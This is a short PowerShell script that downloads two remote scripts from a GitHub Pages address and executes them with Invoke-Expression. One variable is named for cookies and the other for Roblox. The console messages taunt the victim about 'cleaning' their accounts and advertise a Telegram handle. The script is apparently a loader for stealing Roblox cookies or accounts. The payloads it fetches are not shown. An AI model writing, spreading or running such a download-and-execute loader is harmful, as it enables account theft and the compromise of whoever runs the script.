# Set TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Download scripts from GitHub
$cookiesScript = Invoke-WebRequest -Uri 'https://bavavaba39.github.io/robloxmoment.github.io/trolled/main1.ps1' -UseBasicParsing
$robloxScript = Invoke-WebRequest -Uri 'https://bavavaba39.github.io/robloxmoment.github.io/trolled/main2.ps1' -UseBasicParsing

# Execute scripts
try {
    Write-Host "eheheh, running shit =)\n tg@yappydooras"
    Invoke-Expression $robloxScript.Content

    Write-Host "eheheh, running shit =)\n tg@yappydooras, now i clean ur accounts eehehehehheheheh"
    Invoke-Expression $cookiesScript.Content
}
catch {
    Write-Host "Error occurred: $_"
}

Write-Host "bb tg@yappydooras"
pause
